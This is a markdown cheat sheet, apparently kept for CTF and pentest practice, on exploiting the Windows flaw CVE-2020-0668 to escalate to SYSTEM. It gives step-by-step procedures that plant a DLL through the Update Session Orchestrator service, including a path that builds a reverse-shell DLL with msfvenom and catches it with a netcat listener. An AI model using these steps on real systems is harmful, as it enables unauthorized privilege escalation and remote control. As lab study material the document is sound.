# CVE-2020-0668 - Microsoft Windows Service Tracing Arbitrary File Move Local Privilege Escalation Vulnerability

Use CVE-2020-0668 to perform an arbitrary privileged file move operation.

Use [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) (Windows >= 1903) OR [diaghub](https://github.com/xct/diaghub) (Windows < 1903) for privilege escalation.

## Enumeration

```bash
systeminfo
```

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v BuildLabEx
```

## Windows >= 1903

### Usage 1 - UsoDllLoader

> Abuse `Update Session Orchestrator` service with `UsoDllLoader.exe` if not updates pending.

1. Transfer files to target
2. Verify dll file is not present yet - `dir C:\Windows\System32\WindowsCoreDeviceInfo.dll`
3. Execute PS script that abuses of the vuln - `./CVE-2020-0668.ps1`
4. Dll file should be present now - `dir C:\Windows\System32\WindowsCoreDeviceInfo.dll`
5. Use the dll loader - `UsoDllLoader.exe`
6. If it works you should have a shell as `NT AUTHORITY\SYSTEM`

### Usage 2 - UsoClient

> Abuse `Update Session Orchestrator` service with `usoclient` if not updates pending.

1. Create `WindowsCoreDeviceInfo.dll` with reverse shell payload - [msfvenom](https://github.com/rafamarrara/CTFs/blob/main/cheatsheets/toolMsfvenom.md)
2. Transfer files to target (use the revshell dll from previous step)
3. Verify dll file is not present yet - `dir C:\Windows\System32\WindowsCoreDeviceInfo.dll`
4. Execute PS script that abuses of the vuln - `./CVE-2020-0668.ps1`
5. Dll file should be present now - `dir C:\Windows\System32\WindowsCoreDeviceInfo.dll`
6. Start a listener at attack host - `rlwrap -cAr nc -nlvp 4455`
7. Use the command `usoclient StartInteractiveScan` - Note that you won't get any feedback from the command.
8. After a few seconds you should have a shell connecting back to your listener as `NT AUTHORITY\SYSTEM`

### Usage 3 - Mozilla Maintenance Service

> `Mozilla Maintenance Service` service runs in the context of `SYSTEM` and is **startable** by unprivileged users.
> Non-system protected binary for this service: `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

1. TBD
2. `net start MozillaMaintenance`

## Windows < 1903

> TBD

## Extra

Quick powershell script to list available updates to help abusing `Update Session Orchestrator`. If nothing is returned, then no updates are available. There are two options for $r listed below, you can see how they differ.

```powershell
$u = New-Object -ComObject Microsoft.Update.Session
$u.ClientApplicationID = 'MSDN Sample Script'
$s = $u.CreateUpdateSearcher()
#$r = $s.Search("IsInstalled=0 and Type='Software' and IsHidden=0")
$r = $s.Search('IsInstalled=0')
$r.updates|select -ExpandProperty Title
```

## Links

- [itm4n blog - CVE-2020-0668](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/)
- [Microsoft - CVE-2020-0668](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0668)
- [GitHub - UsoDllLoader](https://github.com/itm4n/UsoDllLoader)
- [GitHub - diaghub](https://github.com/xct/diaghub)
- [GitHub - RedCursorSecurityConsulting - CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
- [HTB Remote (Windows >= 1903) - Good lab machine](https://app.hackthebox.com/machines/234)
